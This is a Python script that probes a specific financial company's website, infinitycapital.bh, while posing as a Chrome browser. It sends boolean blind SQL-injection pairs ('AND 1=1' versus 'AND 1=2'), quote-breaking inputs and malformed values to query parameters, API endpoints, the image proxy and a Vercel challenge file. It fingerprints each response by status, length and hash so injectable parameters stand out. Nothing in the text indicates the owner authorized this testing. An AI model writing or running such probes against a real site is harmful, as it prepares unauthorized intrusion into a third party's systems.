import requests, hashlib, sys
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
s=requests.Session()
s.headers.update({'User-Agent':UA,'Accept':'text/html,application/xhtml+xml,*/*'})
B='https://www.infinitycapital.bh'
def g(p, **kw):
    try:
        r=s.get(B+p, timeout=25, allow_redirects=True, **kw)
        h=hashlib.md5(r.content).hexdigest()[:10]
        return f"{r.status_code} len={len(r.content)} md5={h} ct={r.headers.get('content-type','')[:40]}"
    except Exception as e:
        return f"ERR {e}"
paths=["/","/?page=2","/?page=2%20AND%201=1","/?page=2%20AND%201=2","/?page=2'","/?page=abc","/?page=-1","/?page=0",
"/?id=1","/?id=1%20AND%201=1","/?id=1%20AND%201=2","/?id=1'","/?id=abc",
"/?search=test","/?search=test'","/?zzz=1","/?$p","/?$v",
"/api/","/api/?id=1","/api/?id=1%20AND%201=1","/api/?id=1%20AND%201=2","/api/contact","/api/send",
"/contact","/contact?cb=1","/contact?cb=1%20AND%201=1","/contact?cb=1%20AND%201=2","/contact?x=1","/contact?x=1'",
"/404","/404?q=test","/atom.xml","/feeds/all.atom.xml",
"/_next/image?url=&w=100&q=75","/_next/image?url=https%3A%2F%2Fimages.ctfassets.net%2Fyts1dx0j7jj5%2F1GCT0vyjqmOwm2OL1YVpD1%2F2ab55f8b5189afa153eac5cb97f7f6d4%2FAhmed_Taleb_updated-min.jpg&w=1080&q=75",
"/robots.txt","/sitemap.xml","/.well-known/vercel/security/static/challenge.v2.wasm"]
for p in paths:
    print(f"{p}  =>  {g(p)}", flush=True)
